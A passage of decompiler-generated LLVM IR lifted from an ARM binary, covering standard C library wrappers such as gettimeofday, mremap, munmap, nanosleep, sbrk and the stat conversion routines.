  %v1_1575c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15740 ]
  ret i32 %v1_1575c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15758, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15764 = load i32, i32* @r7, align 4
  store i32 %v3_15764, i32* %stack_var_-8, align 4
  %v0_15770 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15770, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15770, -4095
  br i1 %tmp, label %dec_label_pc_15798, label %dec_label_pc_15780

dec_label_pc_15780:                               ; preds = %entry
  %v0_15784 = call i32 @__aeabi_read_tp()
  %v3_15788 = load i16, i16* @global_var_22294.357, align 2
  %v4_15788 = sext i16 %v3_15788 to i32
  store i32 %v4_15788, i32* @r3, align 4
  %v0_1578c = load i32, i32* %r2.global-to-local, align 4
  %v1_1578c = sub i32 0, %v0_1578c
  store i32 %v1_1578c, i32* %r2.global-to-local, align 4
  %v3_15790 = add i32 %v4_15788, %v0_15784
  %v4_15790 = inttoptr i32 %v3_15790 to i32*
  store i32 %v1_1578c, i32* %v4_15790, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15798.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %entry, %dec_label_pc_15780
  %v1_1579c = phi i32 [ %v0_15770, %entry ], [ -1, %dec_label_pc_15780 ]
  %v2_15798 = phi i32 [ %v3_15764, %entry ], [ %v2_15798.pre, %dec_label_pc_15780 ]
  store i32 %v2_15798, i32* @r7, align 4
  ret i32 %v1_1579c

; uselistorder directives
  uselistorder i32 %v0_15770, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15798, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_157b4 = load i32, i32* @r0, align 4
  ret i32 %v1_157b4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_157b8 = load i32, i32* @r4, align 4
  store i32 %v3_157b8, i32* %stack_var_-12, align 4
  %v0_157c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157c8, -4095
  br i1 %tmp, label %dec_label_pc_157f0, label %dec_label_pc_157d8

dec_label_pc_157d8:                               ; preds = %entry
  %v0_157dc = call i32 @__aeabi_read_tp()
  %v3_157e0 = load i16, i16* @global_var_22294.357, align 2
  %v4_157e0 = sext i16 %v3_157e0 to i32
  %v0_157e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157e4 = sub i32 0, %v0_157e4
  store i32 %v1_157e4, i32* %r2.global-to-local, align 4
  %v3_157e8 = add i32 %v4_157e0, %v0_157dc
  %v4_157e8 = inttoptr i32 %v3_157e8 to i32*
  store i32 %v1_157e4, i32* %v4_157e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_157f0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157f0:                               ; preds = %entry, %dec_label_pc_157d8
  %v1_157f4 = phi i32 [ %v0_157c8, %entry ], [ -1, %dec_label_pc_157d8 ]
  %v2_157f0 = phi i32 [ %v3_157b8, %entry ], [ %v2_157f0.pre, %dec_label_pc_157d8 ]
  store i32 %v2_157f0, i32* @r4, align 4
  ret i32 %v1_157f4

; uselistorder directives
  uselistorder i32 %v0_157c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157f0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157fc = load i32, i32* @r7, align 4
  store i32 %v3_157fc, i32* %stack_var_-8, align 4
  %v0_15808 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15808, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15808, -4095
  br i1 %tmp, label %dec_label_pc_15830, label %dec_label_pc_15818

dec_label_pc_15818:                               ; preds = %entry
  %v0_1581c = call i32 @__aeabi_read_tp()
  %v3_15820 = load i16, i16* @global_var_22294.357, align 2
  %v4_15820 = sext i16 %v3_15820 to i32
  %v0_15824 = load i32, i32* %r2.global-to-local, align 4
  %v1_15824 = sub i32 0, %v0_15824
  store i32 %v1_15824, i32* %r2.global-to-local, align 4
  %v3_15828 = add i32 %v4_15820, %v0_1581c
  %v4_15828 = inttoptr i32 %v3_15828 to i32*
  store i32 %v1_15824, i32* %v4_15828, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15830.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15830

dec_label_pc_15830:                               ; preds = %entry, %dec_label_pc_15818
  %v1_15834 = phi i32 [ %v0_15808, %entry ], [ -1, %dec_label_pc_15818 ]
  %v2_15830 = phi i32 [ %v3_157fc, %entry ], [ %v2_15830.pre, %dec_label_pc_15818 ]
  store i32 %v2_15830, i32* @r7, align 4
  ret i32 %v1_15834

; uselistorder directives
  uselistorder i32 %v0_15808, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15830, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1583c = load i32, i32* @r7, align 4
  store i32 %v3_1583c, i32* %stack_var_-8, align 4
  %v0_15848 = load i32, i32* @r0, align 4
  store i32 %v0_15848, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15848, -4095
  br i1 %tmp, label %dec_label_pc_15870, label %dec_label_pc_15858

dec_label_pc_15858:                               ; preds = %entry
  %v0_1585c = call i32 @__aeabi_read_tp()
  %v3_15860 = load i16, i16* @global_var_22294.357, align 2
  %v4_15860 = sext i16 %v3_15860 to i32
  %v0_15864 = load i32, i32* %r2.global-to-local, align 4
  %v1_15864 = sub i32 0, %v0_15864
  store i32 %v1_15864, i32* %r2.global-to-local, align 4
  %v3_15868 = add i32 %v4_15860, %v0_1585c
  %v4_15868 = inttoptr i32 %v3_15868 to i32*
  store i32 %v1_15864, i32* %v4_15868, align 4
  %v2_15870.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15870

dec_label_pc_15870:                               ; preds = %entry, %dec_label_pc_15858
  %v1_15874 = phi i32 [ %v0_15848, %entry ], [ -1, %dec_label_pc_15858 ]
  %v2_15870 = phi i32 [ %v3_1583c, %entry ], [ %v2_15870.pre, %dec_label_pc_15858 ]
  store i32 %v2_15870, i32* @r7, align 4
  ret i32 %v1_15874

; uselistorder directives
  uselistorder i32 %v0_15848, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15870, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15888 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_1588c = icmp eq i32 %v4_15888, 0
  %v3_15890 = load i32, i32* @r4, align 4
  %v9_15890 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1588c, label %dec_label_pc_158a0, label %entry.dec_label_pc_158a8_crit_edge

entry.dec_label_pc_158a8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_158a8

dec_label_pc_158a0:                               ; preds = %entry
  store i32 %v3_15890, i32* @r4, align 4
  store i32 %v9_15890, i32* @r6, align 4
  %v0_158a4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_158a8

dec_label_pc_158a8:                               ; preds = %entry.dec_label_pc_158a8_crit_edge, %dec_label_pc_158a0
  %v0_158a8 = call i32 @__libc_enable_asynccancel()
  %v0_158ac = load i32, i32* @r6, align 4
  store i32 %v0_158ac, i32* @r1, align 4
  store i32 %v0_158a8, i32* @r5, align 4
  %v0_158b4 = load i32, i32* @r4, align 4
  store i32 %v0_158b4, i32* @r0, align 4
  %v0_158b8 = call i32 @__syscall_nanosleep()
  store i32 %v0_158b8, i32* @r4, align 4
  %v0_158c0 = load i32, i32* @r5, align 4
  %v1_158c4 = call i32 @__libc_disable_asynccancel(i32 %v0_158c0)
  %v0_158c8 = load i32, i32* @r4, align 4
  ret i32 %v0_158c8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_158a8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_158dc = load i32, i32* @r4, align 4
  store i32 %v3_158dc, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r4.global-to-local, align 4
  %v4_158ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 11576) to i32*), align 4
  %v2_158f0 = icmp eq i32 %v4_158ec, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_158f0, label %dec_label_pc_158fc, label %dec_label_pc_1590c

dec_label_pc_158fc:                               ; preds = %entry
  %v1_15900 = call i32 @__GI_brk(i32 0)
  %v1_15904 = icmp slt i32 %v1_15900, 0
  br i1 %v1_15904, label %dec_label_pc_15930, label %dec_label_pc_1590cthread-pre-split

dec_label_pc_1590cthread-pre-split:               ; preds = %dec_label_pc_158fc
  %v0_15910.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1590c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1590c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_1590cthread-pre-split, %entry
  %v1_1590c = phi i32 [ %v1_1590c.pre, %dec_label_pc_1590cthread-pre-split ], [ 11576, %entry ]
  %v0_1590c = phi i32 [ %v0_1590c.pre, %dec_label_pc_1590cthread-pre-split ], [ ptrtoint (i32* @global_var_2223c.361 to i32), %entry ]
  %v1_15920 = phi i32 [ %v0_15910.pr, %dec_label_pc_1590cthread-pre-split ], [ %arg1, %entry ]
  %v2_1590c = add i32 %v0_1590c, %v1_1590c
  %v3_1590c = inttoptr i32 %v2_1590c to i32*
  %v4_1590c = load i32, i32* %v3_1590c, align 4
  %v2_15910 = icmp eq i32 %v1_15920, 0
  store i32 %v4_1590c, i32* %r4.global-to-local, align 4
  br i1 %v2_15910, label %dec_label_pc_15934, label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %dec_label_pc_1590c
  %v2_15920 = add i32 %v4_1590c, %v1_15920
  %v1_15924 = call i32 @__GI_brk(i32 %v2_15920)
  %v1_15928 = icmp slt i32 %v1_15924, 0
  br i1 %v1_15928, label %dec_label_pc_15930, label %dec_label_pc_1591c.dec_label_pc_15934_crit_edge

dec_label_pc_1591c.dec_label_pc_15934_crit_edge:  ; preds = %dec_label_pc_1591c
  %v0_15934.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15934

dec_label_pc_15930:                               ; preds = %dec_label_pc_1591c, %dec_label_pc_158fc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_1590c, %dec_label_pc_1591c.dec_label_pc_15934_crit_edge, %dec_label_pc_15930
  %v0_15934 = phi i32 [ %v0_15934.pre, %dec_label_pc_1591c.dec_label_pc_15934_crit_edge ], [ -1, %dec_label_pc_15930 ], [ %v4_1590c, %dec_label_pc_1590c ]
  %v2_15938 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15938, i32* @r4, align 4
  ret i32 %v0_15934

; uselistorder directives
  uselistorder i32 %v4_1590c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15934, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15958 = load i32, i32* @r0, align 4
  ret i32 %v1_15958
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1595c = load i32, i32* @r4, align 4
  store i32 %v3_1595c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15974 = inttoptr i32 %arg2 to i8*
  %v4_15974 = call i32 @__GI_memset(i8* %v3_15974, i32 0, i32 104)
  %v2_15978 = load i32, i32* %arg1, align 4
  store i32 %v2_15978, i32* %r3.global-to-local, align 4
  %v3_15978 = add i32 %tmp, 4
  %v4_15978 = inttoptr i32 %v3_15978 to i32*
  %v5_15978 = load i32, i32* %v4_15978, align 4
  store i32 %v5_15978, i32* %r4.global-to-local, align 4
  %v0_1597c = load i32, i32* %r5.global-to-local, align 4
  %v1_1597c = inttoptr i32 %v0_1597c to i32*
  store i32 %v2_15978, i32* %v1_1597c, align 4
  %v3_1597c = add i32 %v0_1597c, 4
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  %v5_1597c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1597c, i32* %v4_1597c, align 4
  %v0_15980 = load i32, i32* %r6.global-to-local, align 4
  %v1_15980 = add i32 %v0_15980, 12
  %v2_15980 = inttoptr i32 %v1_15980 to i32*
  %v3_15980 = load i32, i32* %v2_15980, align 4
  %v1_15984 = load i32, i32* %r5.global-to-local, align 4
  %v2_15984 = add i32 %v1_15984, 12
  %v3_15984 = inttoptr i32 %v2_15984 to i32*
  store i32 %v3_15980, i32* %v3_15984, align 4
  %v0_15988 = load i32, i32* %r6.global-to-local, align 4
  %v1_15988 = add i32 %v0_15988, 96
  store i32 %v1_15988, i32* %r3.global-to-local, align 4
  %v1_1598c = inttoptr i32 %v1_15988 to i32*
  %v2_1598c = load i32, i32* %v1_1598c, align 4
  store i32 %v2_1598c, i32* %r3.global-to-local, align 4
  %v3_1598c = add i32 %v0_15988, 100
  %v4_1598c = inttoptr i32 %v3_1598c to i32*
  %v5_1598c = load i32, i32* %v4_1598c, align 4
  store i32 %v5_1598c, i32* %r4.global-to-local, align 4
  %v1_15990 = add i32 %v0_15988, 56
  %v2_15990 = inttoptr i32 %v1_15990 to i32*
  %v3_15990 = load i32, i32* %v2_15990, align 4
  store i32 %v3_15990, i32* %r2.global-to-local, align 4
  %v1_15994 = load i32, i32* %r5.global-to-local, align 4
  %v2_15994 = add i32 %v1_15994, 96
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  store i32 %v2_1598c, i32* %v3_15994, align 4
  %v0_15998 = load i32, i32* %r4.global-to-local, align 4
  %v1_15998 = load i32, i32* %r5.global-to-local, align 4
  %v2_15998 = add i32 %v1_15998, 100
  %v3_15998 = inttoptr i32 %v2_15998 to i32*
  store i32 %v0_15998, i32* %v3_15998, align 4
  %v0_1599c = load i32, i32* %r6.global-to-local, align 4
  %v1_1599c = add i32 %v0_1599c, 24
  store i32 %v1_1599c, i32* %ip.global-to-local, align 4
  %v1_159a0 = inttoptr i32 %v1_1599c to i32*
  %v2_159a0 = load i32, i32* %v1_159a0, align 4
  store i32 %v2_159a0, i32* %ip.global-to-local, align 4
  %v3_159a0 = add i32 %v0_1599c, 28
  %v4_159a0 = inttoptr i32 %v3_159a0 to i32*
  %v5_159a0 = load i32, i32* %v4_159a0, align 4
  store i32 %v5_159a0, i32* %lr.global-to-local, align 4
  %v0_159a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_159a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159a4 = add i32 %v1_159a4, 56
  %v3_159a4 = inttoptr i32 %v2_159a4 to i32*
  store i32 %v0_159a4, i32* %v3_159a4, align 4
  %v0_159a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_159a8 = add i32 %v0_159a8, 72
  store i32 %v1_159a8, i32* %r3.global-to-local, align 4
  %v1_159ac = add i32 %v0_159a8, 32
  store i32 %v1_159ac, i32* %r7.global-to-local, align 4
  %v1_159b0 = inttoptr i32 %v1_159ac to i32*
  %v2_159b0 = load i32, i32* %v1_159b0, align 4
  store i32 %v2_159b0, i32* %r7.global-to-local, align 4
  %v3_159b0 = add i32 %v0_159a8, 36
  %v4_159b0 = inttoptr i32 %v3_159b0 to i32*
  %v5_159b0 = load i32, i32* %v4_159b0, align 4
  store i32 %v5_159b0, i32* %r8.global-to-local, align 4
  %v1_159b4 = inttoptr i32 %v1_159a8 to i32*
  %v2_159b4 = load i32, i32* %v1_159b4, align 4
  %v3_159b4 = add i32 %v0_159a8, 76
  %v4_159b4 = inttoptr i32 %v3_159b4 to i32*
  %v5_159b4 = load i32, i32* %v4_159b4, align 4
  store i32 %v5_159b4, i32* %r1.global-to-local, align 4
  %v0_159b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_159b8 = add i32 %v0_159b8, 72
  %v1_159bc = inttoptr i32 %v1_159b8 to i32*
  store i32 %v2_159b4, i32* %v1_159bc, align 4
  %v3_159bc = add i32 %v0_159b8, 76
  %v4_159bc = inttoptr i32 %v3_159bc to i32*
  %v5_159bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159bc, i32* %v4_159bc, align 4
  %v0_159c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_159c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c0 = add i32 %v1_159c0, 32
  %v3_159c0 = inttoptr i32 %v2_159c0 to i32*
  store i32 %v0_159c0, i32* %v3_159c0, align 4
  %v0_159c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_159c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c4 = add i32 %v1_159c4, 36
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  store i32 %v0_159c4, i32* %v3_159c4, align 4
  %v0_159c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_159c8 = add i32 %v0_159c8, 80
  store i32 %v1_159c8, i32* %r3.global-to-local, align 4
  %v1_159cc = add i32 %v0_159c8, 48
  store i32 %v1_159cc, i32* %r7.global-to-local, align 4
  %v1_159d0 = inttoptr i32 %v1_159cc to i32*
  %v2_159d0 = load i32, i32* %v1_159d0, align 4
  store i32 %v2_159d0, i32* %r7.global-to-local, align 4
  %v3_159d0 = add i32 %v0_159c8, 52
  %v4_159d0 = inttoptr i32 %v3_159d0 to i32*
  %v5_159d0 = load i32, i32* %v4_159d0, align 4
  store i32 %v5_159d0, i32* %r8.global-to-local, align 4
  %v1_159d4 = inttoptr i32 %v1_159c8 to i32*
  %v2_159d4 = load i32, i32* %v1_159d4, align 4
  %v3_159d4 = add i32 %v0_159c8, 84
  %v4_159d4 = inttoptr i32 %v3_159d4 to i32*
  %v5_159d4 = load i32, i32* %v4_159d4, align 4
  store i32 %v5_159d4, i32* %r1.global-to-local, align 4
  %v1_159d8 = add i32 %v0_159c8, 16
  %v2_159d8 = inttoptr i32 %v1_159d8 to i32*
  %v3_159d8 = load i32, i32* %v2_159d8, align 4
  store i32 %v3_159d8, i32* %r2.global-to-local, align 4
  %v0_159dc = load i32, i32* %r5.global-to-local, align 4
  %v1_159dc = add i32 %v0_159dc, 80
  %v1_159e0 = inttoptr i32 %v1_159dc to i32*
  store i32 %v2_159d4, i32* %v1_159e0, align 4
  %v3_159e0 = add i32 %v0_159dc, 84
  %v4_159e0 = inttoptr i32 %v3_159e0 to i32*
  %v5_159e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159e0, i32* %v4_159e0, align 4
  %v0_159e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_159e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159e4 = add i32 %v1_159e4, 48
  %v3_159e4 = inttoptr i32 %v2_159e4 to i32*
  store i32 %v0_159e4, i32* %v3_159e4, align 4
  %v0_159e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_159e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_159e8 = add i32 %v1_159e8, 52
  %v3_159e8 = inttoptr i32 %v2_159e8 to i32*
  store i32 %v0_159e8, i32* %v3_159e8, align 4
  %v0_159ec = load i32, i32* %r2.global-to-local, align 4
  %v1_159ec = load i32, i32* %r5.global-to-local, align 4
  %v2_159ec = add i32 %v1_159ec, 16
  %v3_159ec = inttoptr i32 %v2_159ec to i32*
  store i32 %v0_159ec, i32* %v3_159ec, align 4
  %v0_159f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_159f0 = add i32 %v0_159f0, 88
  store i32 %v1_159f0, i32* %r3.global-to-local, align 4
  %v1_159f4 = add i32 %v0_159f0, 20
  %v2_159f4 = inttoptr i32 %v1_159f4 to i32*
  %v3_159f4 = load i32, i32* %v2_159f4, align 4
  store i32 %v3_159f4, i32* %r2.global-to-local, align 4
  %v1_159f8 = inttoptr i32 %v1_159f0 to i32*
  %v2_159f8 = load i32, i32* %v1_159f8, align 4
  %v3_159f8 = add i32 %v0_159f0, 92
  %v4_159f8 = inttoptr i32 %v3_159f8 to i32*
  %v5_159f8 = load i32, i32* %v4_159f8, align 4
  store i32 %v5_159f8, i32* %r1.global-to-local, align 4
  %v1_159fc = add i32 %v0_159f0, 64
  store i32 %v1_159fc, i32* %r6.global-to-local, align 4
  %v1_15a00 = inttoptr i32 %v1_159fc to i32*
  %v2_15a00 = load i32, i32* %v1_15a00, align 4
  store i32 %v2_15a00, i32* %r6.global-to-local, align 4
  %v3_15a00 = add i32 %v0_159f0, 68
  %v4_15a00 = inttoptr i32 %v3_15a00 to i32*
  %v5_15a00 = load i32, i32* %v4_15a00, align 4
  store i32 %v5_15a00, i32* %r7.global-to-local, align 4
  %v0_15a04 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a04 = add i32 %v0_15a04, 88
  store i32 %v1_15a04, i32* %r3.global-to-local, align 4
  %v2_15a08 = add i32 %v0_15a04, 20
  %v3_15a08 = inttoptr i32 %v2_15a08 to i32*
  store i32 %v3_159f4, i32* %v3_15a08, align 4
  %v0_15a0c = load i32, i32* %ip.global-to-local, align 4
  %v1_15a0c = load i32, i32* %r5.global-to-local, align 4
  %v2_15a0c = add i32 %v1_15a0c, 24
  %v3_15a0c = inttoptr i32 %v2_15a0c to i32*
  store i32 %v0_15a0c, i32* %v3_15a0c, align 4
  %v0_15a10 = load i32, i32* %lr.global-to-local, align 4
  %v1_15a10 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a10 = add i32 %v1_15a10, 28
  %v3_15a10 = inttoptr i32 %v2_15a10 to i32*
  store i32 %v0_15a10, i32* %v3_15a10, align 4
  %v0_15a14 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a14 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a14 = add i32 %v1_15a14, 64
  %v3_15a14 = inttoptr i32 %v2_15a14 to i32*
  store i32 %v0_15a14, i32* %v3_15a14, align 4
  %v0_15a18 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a18 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a18 = add i32 %v1_15a18, 68
  %v3_15a18 = inttoptr i32 %v2_15a18 to i32*
  store i32 %v0_15a18, i32* %v3_15a18, align 4
  %v0_15a1c = load i32, i32* %r3.global-to-local, align 4
  %v1_15a1c = inttoptr i32 %v0_15a1c to i32*
  store i32 %v2_159f8, i32* %v1_15a1c, align 4
  %v3_15a1c = add i32 %v0_15a1c, 4
  %v4_15a1c = inttoptr i32 %v3_15a1c to i32*
  %v5_15a1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a1c, i32* %v4_15a1c, align 4
  %v2_15a20 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15a20, i32* %r4.global-to-local, align 4
  ret i32 %v2_159f8

; uselistorder directives
  uselistorder i32 %v0_159f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_159c8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15a28 = load i32, i32* @r4, align 4
  store i32 %v3_15a28, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_15a40 = inttoptr i32 %arg2 to i8*
  %v4_15a40 = call i32 @__GI_memset(i8* %v3_15a40, i32 0, i32 88)
  %v2_15a44 = load i32, i32* %arg1, align 4
  %v3_15a44 = add i32 %tmp, 4
  %v4_15a44 = inttoptr i32 %v3_15a44 to i32*
  %v5_15a44 = load i32, i32* %v4_15a44, align 4
  store i32 %v5_15a44, i32* %r4.global-to-local, align 4
  %v0_15a48 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a48 = inttoptr i32 %v0_15a48 to i32*
  store i32 %v2_15a44, i32* %v1_15a48, align 4
  %v3_15a48 = add i32 %v0_15a48, 4
  %v4_15a48 = inttoptr i32 %v3_15a48 to i32*
  %v5_15a48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a48, i32* %v4_15a48, align 4
  %v0_15a4c = load i32, i32* %r5.global-to-local, align 4
  %v1_15a4c = add i32 %v0_15a4c, 32
  %v1_15a50 = inttoptr i32 %v1_15a4c to i32*
  %v2_15a50 = load i32, i32* %v1_15a50, align 4
  %v3_15a50 = add i32 %v0_15a4c, 36
  %v4_15a50 = inttoptr i32 %v3_15a50 to i32*
  %v5_15a50 = load i32, i32* %v4_15a50, align 4
  store i32 %v5_15a50, i32* %r4.global-to-local, align 4
  %v1_15a54 = add i32 %v0_15a4c, 96
  %v2_15a54 = inttoptr i32 %v1_15a54 to i32*
  %v3_15a54 = load i32, i32* %v2_15a54, align 4
  store i32 %v3_15a54, i32* %r2.global-to-local, align 4
  %v1_15a58 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a58 = add i32 %v1_15a58, 32
  %v3_15a58 = inttoptr i32 %v2_15a58 to i32*
  store i32 %v2_15a50, i32* %v3_15a58, align 4
  %v0_15a5c = load i32, i32* %r4.global-to-local, align 4
  %v1_15a5c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a5c = add i32 %v1_15a5c, 36
  %v3_15a5c = inttoptr i32 %v2_15a5c to i32*
  store i32 %v0_15a5c, i32* %v3_15a5c, align 4
  %v0_15a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a60 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a60 = add i32 %v1_15a60, 12
  %v3_15a60 = inttoptr i32 %v2_15a60 to i32*
  store i32 %v0_15a60, i32* %v3_15a60, align 4
  %v0_15a64 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a64 = add i32 %v0_15a64, 48
  %v2_15a64 = inttoptr i32 %v1_15a64 to i32*
  %v3_15a64 = load i32, i32* %v2_15a64, align 4
  %v1_15a68 = add i32 %v0_15a64, 24
  store i32 %v1_15a68, i32* %ip.global-to-local, align 4
  %v1_15a6c = inttoptr i32 %v1_15a68 to i32*
